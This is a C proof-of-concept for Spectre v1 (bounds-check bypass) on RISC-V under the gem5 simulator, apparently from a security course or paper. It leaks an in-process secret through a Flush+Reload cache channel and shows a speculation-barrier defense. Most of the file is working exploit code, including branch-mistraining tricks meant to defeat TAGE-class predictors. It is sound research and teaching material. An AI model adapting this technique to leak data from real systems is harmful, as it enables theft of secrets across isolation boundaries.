/* spectre_v1_rv.c — Spectre v1 (bounds-check bypass) PoC for RV64GC on gem5.
 *
 * Derived from UT Austin's ECE 382N-Sec Class GitHub at: 
 * https://github.com/ece382n-sec/Example-PoCs/tree/main
 *
 * SIMULATION-ONLY teaching artifact for a security course: it runs inside the
 * gem5 RV64GC O3 model to show (a) that a mistrained bounds check leaks data
 * through a Flush+Reload cache channel, and (b) that a speculation barrier
 * placed after the bounds check (compiled with -DUSE_LFENCE) closes the leak.
 * It targets a secret in its OWN address space; it is not an exploit against
 * any real system and depends on gem5-specific primitives (cbo.flush, rdcycle).
 *
 * Ported from an x86 PoC: clflush->cbo.flush, rdtsc->rdcycle, mfence->fence.
 * REP and the secret length are kept small so it finishes in simulation.
 *
 * Variants (same source):
 *   baseline : SPEC_BARRIER() compiles to nothing  -> secret leaks
 *   lfence   : -DUSE_LFENCE -> SPEC_BARRIER() == spec.fence -> leak blocked
 */
#include "../riscv_asm.h"
#include "../color.h"
#include <assert.h>
#include <ctype.h>
#include <inttypes.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096
#define SYMBOL_CNT 256
#define STRIDE 64   /* one cache line; keeps probe L1-resident in gem5 */
#define REP 16          /* observed before predictor locks on */
#define TRAINING_EPOCH 8
#define BUF_SIZE 20

/* Randomized run-length mistraining (compile with -DRAND_TRAIN): instead of a
 * fixed period, use a pseudo-random number of in-bounds training calls in
 * [TRAIN_MIN,TRAIN_MAX] before each out-of-bounds attack call. The branch's
 * global-history context is then aperiodic, so a TAGE-class predictor (LTAGE)
 * cannot tag a stable pattern and falls back to its bimodal base predictor --
 * which the training has biased "taken" -- and mispredicts the attack. This
 * defeats the predictor that resists the naive periodic PoC. See the paper. */
#define TRAIN_MIN 6
#define TRAIN_MAX 20

/* Tiny deterministic xorshift64 so the "random" schedule is reproducible across
 * runs (important for a paper). Not cryptographic; just needs to be aperiodic
 * over the window the predictor sees. */
static uint64_t _rng_state = 0x9e3779b97f4a7c15ull;
static inline uint64_t rng_next(void) {
    uint64_t x = _rng_state;
    x ^= x << 13; x ^= x >> 7; x ^= x << 17;
    _rng_state = x;
    return x;
}

/* Global-history decorrelation. The victim call is always preceded by the same
 * fixed-length flush loop, so run-length randomization alone leaves the branch
 * history entering the victim branch identical every time -- a TAGE-class
 * predictor tags that stable context and (once it has seen the OOB attack
 * resolve not-taken) predicts the attack correctly, killing the leak after the
 * first byte. Executing a RANDOM-length chain of random-outcome dummy branches
 * immediately before each victim call fills the global history register with
 * noise, so the attack branch presents an untagged context and LTAGE falls back
 * to its PC-indexed base predictor -- which the taken-majority training keeps
 * biased "taken" -> the attack mispredicts and the leak returns. */
static volatile int _decorr_sink;
static inline void decorrelate(uint64_t k) {
    int s = 0;
    for (uint64_t i = 0; i < k; i++) {
        if (rng_next() & 1u) s += 1; else s -= 2;   /* random taken/not-taken */
    }
    _decorr_sink = s;
}

const char *secret = "InfoSec!";   /* short to keep sim time down */

static uint64_t calibrate_latency(void) {
    uint64_t hit = 0, miss = 0, rep = 1000;
    uint8_t *data = malloc(64);
    assert(data);
    _maccess(data);
    for (uint64_t n = 0; n < rep; n++) {
        uint64_t s = _timer_start();
        _maccess(data);
        hit += _timer_end() - s;
    }
    hit /= rep;
    for (uint64_t n = 0; n < rep; n++) {
        _mm_clflush(data);
        _mm_mfence();
        uint64_t s = _timer_start();
        _maccess(data);
        miss += _timer_end() - s;
    }
    miss /= rep;
    uint64_t t = ((2 * miss) + hit) / 3;
    printf("Avg hit: %" PRIu64 ", miss: %" PRIu64 ", threshold: %" PRIu64 "\n",
           hit, miss, t);
    free(data);
    return t;
}

static inline size_t csel(size_t T, size_t F, bool pred) {
    size_t mask = -(size_t)(!!pred);
    return (T & mask) | (F & ~mask);
}

static void decode_state(char *c, uint64_t *hits) {
    uint64_t most = 0; unsigned char raw = 0;
    for (size_t i = 0; i < SYMBOL_CNT; i++)
        if (hits[i] > most) { most = hits[i]; raw = i; }
    *c = isprint(raw) ? raw : '?';
    printf("  best='%c' (0x%02x, hits=%" PRIu64 ")\n", *c, raw, most);
}

/* ---- the vulnerable victim: a bounds check with a Spectre gadget ---- */
uint8_t array[16] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};
volatile size_t array_size = 16;

int victim(uint8_t *pages, size_t idx, size_t stride) {
    int sink = 0;
    if (idx < array_size) {       /* mistrained branch */
        SPEC_BARRIER();           /* DEFENSE: no speculative use of idx past here */
        sink = pages[array[idx] * stride];
    }
    return sink;
}

int main(void) {
    uint64_t threshold = calibrate_latency();
    printf("-----------------------------------------\n");
#ifdef USE_LFENCE
    printf(CYAN_F "Variant: LFENCE (spec.fence defense ENABLED)\n" RESET_C);
#else
    printf(YELLOW_F "Variant: BASELINE (no defense)\n" RESET_C);
#endif
#ifdef RAND_TRAIN
    printf("Training: RANDOMIZED (run-length + history decorrelation; defeats LTAGE)\n");
#else
    printf("Training: PERIODIC (fixed epoch=%d)\n", TRAINING_EPOCH);
#endif

    uint8_t *pages = mmap(NULL, STRIDE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
                          MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    assert(pages != MAP_FAILED);
    memset(pages, 1, STRIDE * SYMBOL_CNT);
    size_t stride = STRIDE;

    size_t malicious_index = (uintptr_t)secret - (uintptr_t)array;
    printf("secret@%p array@%p  malicious_index=%#zx\n",
           (void *)secret, (void *)array, malicious_index);
    printf("-----------------------------------------\n");

    char buf[BUF_SIZE] = {0};
    size_t slen = strlen(secret);
    if (slen > BUF_SIZE - 1) slen = BUF_SIZE - 1;

    /* Mistraining: bias the branch "taken" with in-bound calls, then issue one
     * out-of-bounds "attack" call as the last iteration so its speculative cache
     * footprint is the freshest state when we reload.
     *
     *   default (periodic): exactly (TRAINING_EPOCH-1) training calls each rep.
     *     Simple and reliable against a history-free predictor (BiMode), but a
     *     TAGE-class predictor (LTAGE) learns the fixed period and stops
     *     mispredicting after the first char.
     *   -DRAND_TRAIN (aperiodic): a RANDOM number of training calls per rep, so
     *     there is no period for LTAGE to tag; it falls back to its base
     *     predictor and mispredicts -> the leak is recovered under LTAGE too.
     *
     * The spec.fence defense blocks the leak in every configuration regardless. */
    for (size_t c = 0; c < slen; c++) {
        uint64_t hits[SYMBOL_CNT] = {0};
        for (size_t r = 0; r < REP; r++) {
#ifdef RAND_TRAIN
            size_t train = TRAIN_MIN + (size_t)(rng_next() % (TRAIN_MAX - TRAIN_MIN + 1));
#else
            size_t train = TRAINING_EPOCH - 1;   /* fixed period */
#endif
            for (size_t t = 0; t <= train; t++) {
                bool is_attack = (t == train);
#ifdef RAND_TRAIN
                size_t train_idx = (size_t)(rng_next() % array_size);
#else
                size_t train_idx = r % array_size;
#endif
                size_t index = csel(malicious_index + c, train_idx, is_attack);

                for (size_t j = 0; j < SYMBOL_CNT; j++)
                    _mm_clflush(pages + j * stride);
                _mm_clflush((void *)&array_size);   /* delay branch resolution */
                _mm_mfence();
                _mm_lfence();                        /* attacker-side ordering */

#ifdef RAND_TRAIN
                /* Randomize the global history entering the victim branch so a
                 * TAGE-class predictor cannot tag a stable context (applied to
                 * training and attack calls alike). */
                decorrelate(1u + rng_next() % 6u);
#endif
                _no_opt(victim(pages, index, stride));
            }
            for (size_t i = 0; i < SYMBOL_CNT; i++) {
                size_t idx = (i * 167 + 13) % SYMBOL_CNT;
                if (_time_maccess(pages + idx * stride) <= threshold)
                    hits[idx]++;
            }
        }
        printf("char %zu:\n", c);
        decode_state(&buf[c], hits);
        if (c == 0) {
            /* Dump byte-0's full 256-bin hit distribution for the figure:
             * lines "HIST <symbol> <hits>" (machine-readable, parsed by scripts). */
            for (size_t sidx = 0; sidx < SYMBOL_CNT; sidx++)
                printf("HIST %zu %" PRIu64 "\n", sidx, hits[sidx]);
        }
    }

    printf("-----------------------------------------\n");
    printf("Expected : %.*s\n", (int)slen, secret);
    printf("Recovered: %s\n", buf);
    size_t ok = 0;
    for (size_t i = 0; i < slen; i++) ok += (buf[i] == secret[i]);
    printf("Accuracy : %zu/%zu bytes\n", ok, slen);
    munmap(pages, STRIDE * SYMBOL_CNT);
    return 0;
}
